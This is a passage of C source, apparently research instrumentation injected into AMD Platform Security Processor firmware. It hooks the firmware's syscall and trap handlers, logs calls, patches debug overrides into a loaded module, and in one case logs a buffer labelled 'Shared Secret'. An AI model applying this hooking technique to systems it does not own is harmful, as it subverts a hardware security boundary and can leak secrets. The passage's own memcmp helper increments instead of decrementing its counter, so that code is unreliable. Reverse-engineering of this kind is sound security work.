                    svcTraceAppendString("]: ");
                    svcTraceAppendHexU32(*(volatile uint32_t *)(0x3220000 + i * 4));
                    svcTraceAppendString("\n");
                }
                svcTraceDumpVal(SVC_PSP_LOG_MARKER_STRING);
#else
                svcTraceDumpLogMarker();
                svcTraceAppendString("bmSmnMemMapSlotsFree: ");
                svcTraceAppendHexU32(*(uint32_t *)0xce94);
                svcTraceAppendString("\n");
                svcTraceDumpLogMarker();
#endif
            }
            break;
        }
        case SVC_DBG_PRINT:
        {
            const char *psz = (const char *)pRegs->auGprs[0];
            if (   strncmp(psz, "\t\n~SMN W", sizeof("~SMN W") - 1) != 0
                && strncmp(psz, "\t\n~SMN R", sizeof("~SMN R") - 1) != 0
                && strncmp(psz, "~W SMN_UMC0_CTRL", sizeof("~W SMN_UMC0_CTRL") - 1) != 0)
                svc_0x6_dbg_print(psz);
            return 0;
        }
        case SVC_INJECTED_MAP_X86_HOST_MEMORY_EX:
        {
            uint64_t PhysX86Addr = (uint64_t)pRegs->auGprs[0] | ((uint64_t)pRegs->auGprs[1] << 32);
            return (uint32_t)(uintptr_t)((PFNMAPX86HOSTMEMORYEX)PSP_MAP_X86_HOST_MEMORY_EX_ADDR)(PhysX86Addr, pRegs->auGprs[2], pRegs->auGprs[3]);
        }
        case SVC_INJECTED_DBG_MARKER_1:
        case SVC_INJECTED_DBG_MARKER_2:
        case SVC_INJECTED_DBG_MARKER_3:
        case SVC_INJECTED_DBG_MARKER_4:
        case SVC_INJECTED_DBG_MARKER_5:
            svcTraceDumpLogMarker();
            svcTraceAppendString("DbgMarker: ");
            svcTraceAppendHexU32(idxSyscall);
            svcTraceAppendString(" ");
            svcTraceAppendHexU32(pRegs->auGprs[0]);
            svcTraceAppendString(" ");
            svcTraceAppendHexU32(pRegs->auGprs[1]);
            svcTraceAppendString(" ");
            svcTraceAppendHexU32(pRegs->auGprs[2]);
            svcTraceAppendString(" ");
            svcTraceAppendHexU32(pRegs->auGprs[3]);
            svcTraceAppendString("\n");
            svcTraceDumpLogMarker();
            return pRegs->auGprs[0];
#if 0
        case SVC_SMU_MSG:
            /* Make the end message a no-op. */
            if (pRegs->auGprs[0] == 0x14 && pRegs->auGprs[1] == 0 && pRegs->auGprs[2] == 0)
            {
                svcTraceDumpLogMarker();
                svcTraceAppendString("Turned SMU end msg into a NOP\n");
                svcTraceDumpLogMarker();
                return 0;
            }
            break;
#endif
        case SVC_LOG_CHAR_BUF:
            svcTraceDumpLogMarker();
            svcTraceAppendStringN((const char *)pRegs->auGprs[0], (size_t)pRegs->auGprs[1]);
            svcTraceDumpLogMarker();
            return pRegs->auGprs[0];
        case 0xff:
            svcTraceDumpLogMarker();
            svcTraceAppendString("Shared Secret: ");
            svcTraceAppendBuf((uint8_t*)pRegs->auGprs[0], pRegs->auGprs[1]);
            svcTraceAppendString("\n");
            svcTraceDumpLogMarker();
            return pRegs->auGprs[0];
        case 0x3f: /* Related to TMR handling not present in original SVC code, just stores the given TMR range in some global memory. */
            return 0;
    }

    uint32_t u32Ret = ((PFNPSPSVCHANDLER)(PSP_SVC_HANDLER_ADDR))(idxSyscall, pRegs);

    switch (idxSyscall)
    {
        case SVC_FFS_ENTRY_READ:
        {
            /* Patch in the debug override if the AR3B module was loaded. */
            if (pRegs->auGprs[0] == 0x33)
            {
                svcTraceDumpLogMarker();
                svcTraceAppendString("AR3B loaded, overriding debug logging: ");
                svcTraceAppendHexU32(pRegs->auGprs[0]);
                svcTraceAppendString(" ");
                svcTraceAppendHexU32(pRegs->auGprs[1]);
                svcTraceAppendString(" ");
                svcTraceAppendHexU32(pRegs->auGprs[2]);
                svcTraceAppendString("\n");
                svcTraceDumpLogMarker();
                memcpy((void *)AR3B_DBG_OVERRIDE_1_ADDR, &ar3b_dbg_override1[0], sizeof(ar3b_dbg_override1));
                memcpy((void *)AR3B_DBG_OVERRIDE_2_ADDR, &ar3b_dbg_override2[0], sizeof(ar3b_dbg_override2));
                ((PFNPSPINVMEM)PSP_INV_MEM_ADDR)(0x2, 0, 0, 0xffffffff);
                ((PFNPSPINVMEM)PSP_INV_MEM_ADDR)(0x2, 1, 0, 0xffffffff);
            }
            break;
        }
        case SVC_SMN_MAP_ADDR_EX:
        case SVC_SMN_MAP_ADDR:
        case SVC_SMN_UNMAP_ADDR:
        {
            if (g_fDumpSmnRegsOnMap == 0xdeadbeef)
            {
                svcTraceDumpLogMarker();
                svcTraceAppendString("bmSmnMemMapSlotsFree: ");
                svcTraceAppendHexU32(*(uint32_t *)0xce94);
                svcTraceAppendString("\n");
                svcTraceDumpLogMarker();
            }
            break;
        }
    }

    svcTraceExit(idxSyscall, pRegs, u32Ret);

    return u32Ret;
}

void svc_trap_handler(uint32_t *pau32Info)
{
    svcTraceDumpLogMarker();
    svcTraceAppendString("TRAP: ");
    for (uint32_t i = 0; i < 18; i++)
    {
        svcTraceAppendHexU32(pau32Info[i]);
        svcTraceAppendString(" ");
    }
    svcTraceDumpLogMarker();

    /* Hang like the original. */
    while (1);
}

#define PSP_FW_SVC_HANDLER_PATCH_ADDR ((void *)0x544)

#define PSP_FW_TRAP_HANDLER_PATCH_ADDR ((void *)0x53c)

/**
 * SVC interception handler for logging and tracing.
 *
 * @returns Flag whether to call the original syscall handler, 1 to call it 0 otherwise.
 * @param   idxSyscall          The syscall number being called.
 * @param   pRegs               APP registers containing the arguments.
 * @param   prcSvcHnd           Where to store the return value for the intercepted SVC handler.
 */
int svc_inject_handler(uint32_t idxSyscall, PPSPREGFRAME pRegs, uint32_t *prcHnd)
{
    if (g_uCpuId == 0xffffffff)
    {
        /*
         * Initialize the CPU ID and place a detection marker so the log extractor
         * can find the PSP.
         */
        g_uCpuId = get_cpu_id();
        g_fSvcTraceArm = 0;
        *(volatile uint32_t *)PSP_FW_SVC_HANDLER_PATCH_ADDR = (uint32_t)((uintptr_t)svc_trace_intercept) | 1;
        *(volatile uint32_t *)PSP_FW_TRAP_HANDLER_PATCH_ADDR = (uint32_t)((uintptr_t)svc_trap_handler) | 1;
        svcTraceDumpLogMarker();
        svcTraceAppendString("CcxId: ");
        svcTraceAppendHexU32(*(uint32_t *)PSP_CCX_ID_ADDR);
        svcTraceAppendString("\n");
        svcTraceDumpLogMarker();
    }

    *prcHnd = 0;

#if 0
    /* Try to access an unmapped address to trigger a fault for testing the trap handler. */
    *(volatile uint32_t *)(0x52000) = 0x0;
#endif

    if (idxSyscall == SVC_DBG_PRINT)
    {
        svc_0x6_dbg_print((const char *)pRegs->auGprs[0]);
        return 0;
    }
    return 1;
}


/**
 * Generates and returns a unique PSP ID using the CCP TRNG.
 *
 * @returns PSP ID.
 */
static uint32_t get_cpu_id()
{
    return *(uint32_t *)PSP_CCX_ID_ADDR;
}

static int strncmp(const char *psz1, const char *psz2, uint32_t cch)
{
    while (   cch
           && *psz1 == *psz2)
    {
        psz1++;
        psz2++;
        cch--;
    }

    return cch == 0 ? 0 : 1;
}

static int memcmp(const void *pv1, const void *pv2, size_t cb)
{
    uint8_t *pb1 = (uint8_t *)pv1;
    uint8_t *pb2 = (uint8_t *)pv2;

    while (cb)
    {
        if (pb1[cb] != pb2[cb])
            return pb1[cb] - pb2[cb];

        cb++;
    }

    return 0;
}

static void memcpy(void *pvDst, const void *pvSrc, size_t cb)
{
    uint8_t *pbDst = (uint8_t *)pvDst;
    uint8_t *pbSrc = (uint8_t *)pvSrc;

    for (unsigned i = 0; i < cb; i++)
        *pbDst++ = *pbSrc++;
}

static void svc_0x6_dbg_print(const char *pszStr)
{
    /* Write debug log marker. */
    svcTraceDumpLogMarker();
    svcTraceAppendString(pszStr);
    /* Write debug log marker to mark the end of the string. */
    svcTraceDumpLogMarker();
}

